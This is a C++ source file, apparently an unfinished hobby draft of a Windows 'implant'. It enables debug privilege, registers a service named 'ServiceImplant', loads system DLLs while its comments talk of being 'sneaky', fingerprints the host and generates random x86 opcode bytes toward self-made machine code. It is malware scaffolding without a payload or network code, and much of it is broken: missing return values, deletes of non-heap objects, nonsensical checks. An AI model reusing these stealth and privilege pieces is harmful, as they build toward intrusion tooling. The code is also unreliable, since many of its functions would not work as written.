#include <Windows.h>
#include <iostream>
#include <vector>
#include <unordered_map>
#include <unordered_set>
#include <system_error>
#include <thread>
#include <functional>
#include <random>
#include <set>
#include <intrin.h>
struct KernIssues {
	std::unordered_map<std::string, int> errors;
	std::multiset<std::pair<int, std::string>> DllErrors;
};

KernIssues Issues;
struct ErrorOp {
	std::error_code operator()(std::error_code ec) {
		if (ec) {
			Issues.DllErrors.insert({ ec.value(), ec.category().name() });
			std::cerr << "Error: " << ec.message() << std::endl;
		}
		return ec;
	}
	ErrorOp() {
		operator()(std::error_code(GetLastError(), std::system_category()));
	}

	int operator()(int error) {
		if (error != 0) {
			std::error_code ec = std::error_code(error, std::system_category());
			Issues.DllErrors.insert({ ec.value(), ec.category().name() });
			std::cerr << "Error: " << error << std::endl;
			operator()(ec);
		}
		return error;
	}
};

auto g_hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
/*
* Windows Service main similar to program int main however in relation to the service im running from the prorgam executed.
*/
void ServiceMain(DWORD argc, LPTSTR* argv) {
	std::cout << "Implant is operational.." << std::endl;
	Sleep(600000);
	SetEvent(g_hStopEvent); // 10 minutes service shutdown
}

void ServiceCtrlHandler(DWORD dwCtrl) {
	switch (dwCtrl) {
	case SERVICE_CONTROL_STOP:
		SetEvent(g_hStopEvent);
		return;
	}
}

void PassAdminPrivileges(std::thread& t) {
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "Error opening process token: " << GetLastError() << std::endl;
		return;
	}

	TOKEN_PRIVILEGES tp{};
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
		std::cerr << "Error looking up privilege value: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
		std::cerr << "Error adjusting token privileges: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return;
	}
	CloseHandle(hToken);

	t = std::thread([] {
		SERVICE_TABLE_ENTRY DispatchTable[] = {
		  { (LPTSTR)(L"ServiceImplant"), reinterpret_cast<LPSERVICE_MAIN_FUNCTION>(ServiceMain) },
		  { NULL, NULL }
		};
	if (!StartServiceCtrlDispatcher(DispatchTable)) {
		std::cerr << "Implant failed: " << GetLastError() << std::endl;
	}
		});
	t.detach();
}


void Kern(SYSTEMTIME* systemTime) {
	struct DllStore {
		std::vector<LPCWSTR> dlls;
		int DLLCount;
	};
	DllStore dllList = {
	{ L"kernel32.dll", L"shell32.dll" },
	2
	};
	//tries to do two things first is the attempt to do it more sneaky 
	//got first see if the dll process is already running if it is then the module handle can handle the present dll  
	//without the use of loadlibrary

	//however the worst situation is gonna be the load library as this will be the most obvious because it will be a new process
	//that is being created and the dll will be loaded into that process
	for (int i = 0; i < dllList.DLLCount; ++i) {
		HINSTANCE hDll = GetModuleHandle(dllList.dlls[i]);
		if (hDll == NULL) {
			hDll = LoadLibrary(dllList.dlls[i]);
			if (hDll == NULL) {
				DWORD error = GetLastError();
				std::cerr << "Handle for the dll Has Failed" << (std::string*)dllList.dlls[i] << ".errorcode: " << error << std::endl;
				Issues.DllErrors.insert({ error, "LoadLibrary" });
				continue;
			}
		}
		std::cout << "Loaded " << (std::string*)dllList.dlls[i] << std::endl;
	}
	std::thread t;
	PassAdminPrivileges(t);
	ErrorOp errorOp;
	errorOp(GetLastError());
}

/*
* Binary Instruction generation
* 
*/
/*
further improvements to this function would be to add more instructions to the vector but dynamically.
*/
struct SystemHardwareCheck{
std::string ProcessBrand() {
	int cpuInfo[4];
	__cpuid(cpuInfo, 0);

	char processorBrand[0x40];
	memset(processorBrand, 0, sizeof(processorBrand));

	for (int i = 0; i < 3; ++i) {
		__cpuid(cpuInfo, 0x80000002 + i);
		memcpy(processorBrand + i * 16, cpuInfo, sizeof(cpuInfo));
	}
	processorBrand[0x3F] = '\0'; 

	return processorBrand;
}
	bool Is64Bit() {
#if defined(_WIN64)
		return true;
#elif defined(_WIN32)
		BOOL f64 = FALSE;
		return IsWow64Process(GetCurrentProcess(), &f64) && f64;
#else
		return false;
#endif
	}
	long long int GetSystemMemory() {
		MEMORYSTATUSEX memInfo{};
		memInfo.dwLength = sizeof(MEMORYSTATUSEX);
		GlobalMemoryStatusEx(&memInfo);
		return memInfo.ullTotalPhys;
	}
	std::string GetSystemName() {
		//later functions for network 
		char computerName[MAX_COMPUTERNAME_LENGTH + 1];
		DWORD size = sizeof(computerName) / sizeof(computerName[0]);
		GetComputerNameA(computerName, &size);
		return computerName;
	}
	struct SystemInternalErrors {
		std::function<void(int)> ErrorOp = [](int error) {
			std::cerr << "Error: " << error << std::endl;
		};
	};
	SystemHardwareCheck() {
		std::string cpuBrand = ProcessBrand();
		std::string systemName = GetSystemName();
		long long int systemMemoryRam = GetSystemMemory();
		bool is64arch = Is64Bit();
		SystemInternalErrors Issues;
		if (cpuBrand.empty()) {
			Issues.ErrorOp(GetLastError());
		}
		if (systemName.empty()) {
			Issues.ErrorOp(GetLastError());
		}
		float GB = systemMemoryRam / static_cast<float>(1024) * 1024 * 1024;
		int Gb = GB;
		if (systemMemoryRam == 0) {
			Issues.ErrorOp(GetLastError());
		}
		else if (GB != (int)systemMemoryRam) {
			if (GB - floor(GB) >= 0.5) {
				Gb = ceil(GB);//ceiling
			}
			else {
				Gb = floor(GB);//or the floor of the closest whole number if error on conversion
			}
		}
		if (is64arch == false) {

		}
					 //Still unfinhsed first draft\\
					// RELATED TO x86 new instruction set
					//Issues.ErrorOp(GetLastError());
		 		//				//
	}//			||				||
	//			\/				\/
};			


struct x86_newInstructionSet {
	std::vector<std::vector<unsigned char>> x86_instructions = {
	{0x90}, {0xC3}, {0x89, 0xD8}, {0xFF, 0xE3}, {0x50}, {0x5B},
	{0x01, 0xD8}, {0x29, 0xD8}, {0x0F, 0xAF, 0xC3}, {0xF7, 0xFB} //9+new instruct addition through constructor call and maybe a functor .
	};
};
std::vector<unsigned char> generate_instruction() {
	std::mt19937 RandomPos(std::random_device{}());
	std::uniform_int_distribution<int> dist(0, 9); //0-9
	int index = dist(RandomPos); //0-9 (rng value)	
	return x86_newInstructionSet().x86_instructions[index];
}

std::vector<unsigned char> generate_instructions(int count) {
	std::vector<unsigned char> x86_code;
	for (int i = 0; i < count; ++i) {
		std::vector<unsigned char> instruction = generate_instruction();
		x86_code.insert(x86_code.end(), instruction.begin(), instruction.end());
	}
	return x86_code;
}
struct Random {
	std::function<std::vector<unsigned char>()> binaryx64 = []() {
		auto binaryRun = []() {
			std::vector<unsigned char> x86_code = generate_instructions(1000);
			bool syntax_error = false;
			for (unsigned char byte : x86_code) {
				if (byte > 0xFF) {
					syntax_error = true;
					break;
				}
			}
			if (syntax_error) {
				std::cerr << "Invalid Opcode" << std::endl;
				return std::vector<unsigned char>();
			}
			else {

				return x86_code;
			}
		};
		return binaryRun();
	};
};
Random Bin64x;
std::vector<unsigned char> BInstructions = Bin64x.binaryx64();
int binaryTestPointOne() {
	if (BInstructions.empty()) {
		BInstructions.~vector();
		return 1;
	}else return 0;
}
std::vector<std::pair<unsigned char, unsigned char>> InstructionCheck() {
	bool ValidBinaryOne = false;
	int BinaryReturnSignal = binaryTestPointOne();
	if (BinaryReturnSignal == 0) {
		ValidBinaryOne = true;
		std::vector<unsigned char> localInstruct(250);
		std::vector<unsigned char> localInstructOne(250);
		std::mt19937 Rand(std::random_device{}());
		std::uniform_int_distribution<int> dist(0, 999); //0-999 instructions
		for (unsigned char Instruction : BInstructions) {
			int randomIndex = dist(Rand); // get a random index pos from 0 - 999
			if (randomIndex < 500) {
				localInstruct[randomIndex % 250] = Instruction;
			}
			else {
				localInstructOne[randomIndex % 250] = Instruction;
			}
		}
		std::vector<std::pair<unsigned char, unsigned char>> InstructionsMap;
		for (int i = 0; i < 250; ++i) {
			InstructionsMap.push_back({ localInstruct[i], localInstructOne[i] });
		}
		return InstructionsMap;
	}
	else {
		delete &BInstructions;
		delete &Bin64x;
		return std::vector<std::pair<unsigned char, unsigned char>>();
	}
}
unsigned char instruction() {
	std::set<unsigned char> instructionNew;
	std::vector<std::pair<unsigned char, unsigned char>> instructions = InstructionCheck();
	for (auto& [first, second] : instructions) {
		instructionNew.insert(first);
		instructionNew.insert(second);
	}
	unsigned char instructionbyte[250]{};
	int i = 0;
	for (unsigned char val : instructionNew) {
		instructionbyte[++i] = val;
	}
	std::mt19937 Random(std::random_device{}());
	std::uniform_int_distribution<int> dist(0, 250);
	int rando = dist(Random);
	return instructionbyte[rando]; //return random instruction from0-250 index pos.
}

void InstructionLogicCall() {
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	Kern(&systemTime); //load in the dlls and get the handle based on the system time
}


struct boolcheck {
	bool duplicationcheck = false;
	bool finished = false;


	//on call of the struct reset to false not needed tho for now.
	/*
	boolcheck() {
		duplicationcheck = false;
		finished = false;
	}
	*/
};

boolcheck* boolchecks = new boolcheck();
std::vector<unsigned char> instructionSetCheck() {
	struct instructionMaker { //time complexity issue but its needed for now.
								//*stackoverflow bug needing to fix that for anyexcessive duplicates.
		unsigned char instructionA;
		unsigned char instructionB;
		unsigned char instructionC;
		unsigned char instructionD;
		instructionMaker() {
			instructionA = instruction();
			instructionB = instruction();
			instructionC = instruction();
			instructionD = instruction();
			std::unordered_set<unsigned char> instructionCheck;
			instructionCheck.insert(instructionA);
			instructionCheck.insert(instructionB);
			instructionCheck.insert(instructionC);
			instructionCheck.insert(instructionD);

			//first check
			bool isduplicated = false;
			for (auto i = instructionCheck.begin(); i != instructionCheck.end(); ++i) {
				if (instructionCheck.count(*i) > 1) {
					isduplicated = true;
					boolchecks->duplicationcheck = true;
					instructionCheck.erase(i);
					instructionCheck.insert(instruction());//may still emplace a duplicate :/
					--i;
				}
			}
			if (isduplicated) {
				instructionA = *instructionCheck.begin();
				instructionB = *std::next(instructionCheck.begin(), 1);
				instructionC = *std::next(instructionCheck.begin(), 2);
				instructionD = *std::next(instructionCheck.begin(), 3);
			}
			//second check
			std::vector<unsigned char>* SetInstruct = new std::vector<unsigned char>();
			SetInstruct->push_back(instructionA);
			SetInstruct->push_back(instructionB);
			std::vector<unsigned char>* SetInstruction = new std::vector<unsigned char>(*SetInstruct);
			SetInstruction->push_back(instructionC);
			SetInstruction->push_back(instructionD);
			for (auto a = SetInstruction->begin(); a != SetInstruction->end(); ++a) {
				for (auto b = a + 1; b != SetInstruction->end(); ++b) {
					if (*a == *b) {
						boolchecks->duplicationcheck = true;
						b = SetInstruction->erase(b);
						--b;
					} 
				}
			}
			for (auto c = SetInstruct->begin(); c != SetInstruct->end(); ++c) {
				for (auto d = SetInstruction->begin(); d != SetInstruction->end(); ++d) {
					if (*c == *d) {
						boolchecks->duplicationcheck = true;
						c = SetInstruction->erase(d);
						--d;
					}
				};
			}
			//now the check has happened 
			delete SetInstruct; //not needed anymore
			delete SetInstruction; //not needed 
			
			//final instruction set
			//idea 1 if we know the dup has occured through the bool flag maybe double check before anything else is to happen with the instruction set.
			instructionA = *std::next(instructionCheck.begin(), 0);
			instructionB = *std::next(instructionCheck.begin(), 1);
			instructionC = *std::next(instructionCheck.begin(), 2);
			instructionD = *std::next(instructionCheck.begin(), 3);
			boolchecks->finished = true; //okay global is now confirmed to be true.

		}
	};
}

std::vector<unsigned char>* instructionCreation() {
	instructionSetCheck(); //check if the instruction set is valid.
		if (boolchecks->duplicationcheck != true && boolchecks->finished == true) {


		}
		else {

		}
//return a instruction vector next function will use the machine code and see if its logically runnable if it is continue the machine code devlopment
//maybe also create a new machine code file however this is very suss.
}


int main() {
	instructionSetCheck();
	InstructionLogicCall();
	return 0;
}
/*
TO DO MEMORY LEAKS.
deconstruct unused data structs once they are no longer in use.

global var clean up.
*/